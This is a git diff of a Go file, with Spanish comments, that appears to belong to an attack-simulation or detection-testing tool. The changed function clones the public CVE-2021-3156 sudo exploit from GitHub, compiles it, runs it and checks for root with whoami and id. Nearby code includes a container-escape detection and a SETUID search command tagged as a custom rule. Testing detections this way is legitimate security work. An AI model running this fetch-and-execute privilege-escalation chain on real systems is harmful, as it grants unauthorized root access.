@@ -712,6 +712,96 @@ func SudoPotentialPrivilegeEscalation() {
 
 // }
 
+// // ultima que funciono
+// func SudoPotentialPrivilegeEscalationExploitation() {
+
+// 	// Cambiar al directorio home del usuario
+// 	homeDir := "/home/pepe"
+// 	if err := os.Chdir(homeDir); err != nil {
+// 		fmt.Printf("Error al cambiar al directorio home: %v\n", err)
+// 		return
+// 	}
+// 	fmt.Printf("Directorio de trabajo cambiado a: %s\n", homeDir)
+
+// 	// Verificar si la carpeta CVE-2021-3156 ya existe
+// 	repoDir := "CVE-2021-3156"
+// 	if _, err := os.Stat(repoDir); !os.IsNotExist(err) {
+// 		// Si la carpeta existe, eliminarla
+// 		fmt.Printf("La carpeta %s ya existe. Eliminándola...\n", repoDir)
+// 		rmCmd := exec.Command("rm", "-rf", repoDir)
+// 		rmOut, rmErr := rmCmd.CombinedOutput()
+// 		if rmErr != nil {
+// 			fmt.Printf("Error al eliminar la carpeta: %v\n", rmErr)
+// 			fmt.Printf("Salida del comando: %s\n", rmOut)
+// 			return
+// 		}
+// 		fmt.Println("Carpeta eliminada exitosamente")
+// 	}
+
+// 	// Clonar el repositorio
+// 	cloneCmd := exec.Command("git", "clone", "https://github.com/blasty/CVE-2021-3156.git")
+// 	cloneOut, cloneErr := cloneCmd.CombinedOutput()
+// 	if cloneErr != nil {
+// 		fmt.Printf("Error al clonar el repositorio: %v\n", cloneErr)
+// 		fmt.Printf("Salida del comando: %s\n", cloneOut)
+// 		return
+// 	}
+// 	fmt.Println("Repositorio clonado exitosamente")
+// 	fmt.Printf("Salida del comando: %s\n", cloneOut)
+
+// 	// Cambiar al directorio del repositorio clonado
+// 	if err := os.Chdir(repoDir); err != nil {
+// 		fmt.Printf("Error al cambiar al directorio del repositorio: %v\n", err)
+// 		return
+// 	}
+// 	fmt.Println("Cambiado al directorio CVE-2021-3156")
+
+// 	// Ejecutar 'make'
+// 	makeCmd := exec.Command("make")
+// 	makeOut, makeErr := makeCmd.CombinedOutput()
+// 	if makeErr != nil {
+// 		fmt.Printf("Error al ejecutar 'make': %v\n", makeErr)
+// 		fmt.Printf("Salida del comando: %s\n", makeOut)
+// 		return
+// 	}
+// 	fmt.Println("Comando 'make' ejecutado exitosamente")
+// 	fmt.Printf("Salida del comando: %s\n", makeOut)
+
+// 	// Ejecutar './sudo-hax-me-a-sandwich 0'
+// 	runCmd := exec.Command("./sudo-hax-me-a-sandwich", "0")
+// 	runOut, runErr := runCmd.CombinedOutput()
+// 	if runErr != nil {
+// 		fmt.Printf("Error al ejecutar './sudo-hax-me-a-sandwich 0': %v\n", runErr)
+// 		fmt.Printf("Salida del comando: %s\n", runOut)
+// 		return
+// 	}
+// 	fmt.Println("Comando './sudo-hax-me-a-sandwich 0' ejecutado exitosamente")
+// 	fmt.Printf("Salida del comando: %s\n", runOut)
+
+// 	// Ejecutar 'whoami' para obtener el usuario actual
+// 	whoamiCmd := exec.Command("whoami")
+// 	whoamiOut, whoamiErr := whoamiCmd.CombinedOutput()
+// 	if whoamiErr != nil {
+// 		fmt.Printf("Error al ejecutar 'whoami': %v\n", whoamiErr)
+// 		fmt.Printf("Salida del comando: %s\n", whoamiOut)
+// 		return
+// 	}
+// 	fmt.Printf("Usuario actual: %s\n", whoamiOut)
+
+// 	// Ejecutar 'id' para obtener el ID del usuario actual
+// 	idCmd := exec.Command("id")
+// 	idOut, idErr := idCmd.CombinedOutput()
+// 	if idErr != nil {
+// 		fmt.Printf("Error al ejecutar 'id': %v\n", idErr)
+// 		fmt.Printf("Salida del comando: %s\n", idOut)
+// 		return
+// 	}
+// 	fmt.Printf("ID de usuario: %s\n", idOut)
+
+// 	// Continuar con el flujo del programa
+// 	fmt.Println("Continuando con el flujo del programa")
+// }
+
 func SudoPotentialPrivilegeEscalationExploitation() {
 
 	// Cambiar al directorio home del usuario
@@ -777,25 +867,15 @@ func SudoPotentialPrivilegeEscalationExploitation() {
 	fmt.Println("Comando './sudo-hax-me-a-sandwich 0' ejecutado exitosamente")
 	fmt.Printf("Salida del comando: %s\n", runOut)
 
-	// Ejecutar 'whoami' para obtener el usuario actual
-	whoamiCmd := exec.Command("whoami")
-	whoamiOut, whoamiErr := whoamiCmd.CombinedOutput()
-	if whoamiErr != nil {
-		fmt.Printf("Error al ejecutar 'whoami': %v\n", whoamiErr)
-		fmt.Printf("Salida del comando: %s\n", whoamiOut)
+	// Ejecutar un shell interactivo para capturar 'whoami' y 'id' en el mismo contexto
+	shellCmd := exec.Command("/bin/bash", "-c", "whoami && id")
+	shellOut, shellErr := shellCmd.CombinedOutput()
+	if shellErr != nil {
+		fmt.Printf("Error al ejecutar 'whoami && id': %v\n", shellErr)
+		fmt.Printf("Salida del comando: %s\n", shellOut)
 		return
 	}
-	fmt.Printf("Usuario actual: %s\n", whoamiOut)
-
-	// Ejecutar 'id' para obtener el ID del usuario actual
-	idCmd := exec.Command("id")
-	idOut, idErr := idCmd.CombinedOutput()
-	if idErr != nil {
-		fmt.Printf("Error al ejecutar 'id': %v\n", idErr)
-		fmt.Printf("Salida del comando: %s\n", idOut)
-		return
-	}
-	fmt.Printf("ID de usuario: %s\n", idOut)
+	fmt.Printf("Información de usuario después de ejecutar el exploit:\n%s\n", shellOut)
 
 	// Continuar con el flujo del programa
 	fmt.Println("Continuando con el flujo del programa")
@@ -860,9 +940,6 @@ func DetecteReleaseAgentFileContainerEscapes() {
 
 }
 
-// Adversario intenta escalar privilegios utilizando una estrategia de SETUID.
-// find / -perm -u=s -type f 2>/dev/null   [Custom Rule]
-// Requires running a privileged container and root privileges are required to run it.
 func UnmountBind() {
 	// Comando que deseas ejecutar
 	cmd := exec.Command("sudo", "umount", "/bin/mount")
@@ -877,6 +954,9 @@ func UnmountBind() {
 	fmt.Println("Comando umount ejecutado exitosamente:", string(output))
 }
 
+// Adversario intenta escalar privilegios utilizando una estrategia de SETUID.
+// find / -perm -u=s -type f 2>/dev/null   [Custom Rule]
+// Requires running a privileged container and root privileges are required to run it.
 func MountLaunchedInPrivilegedContainer() error {
 	// Defer para ejecutar el unmount al final de la función
 	defer UnmountBind()
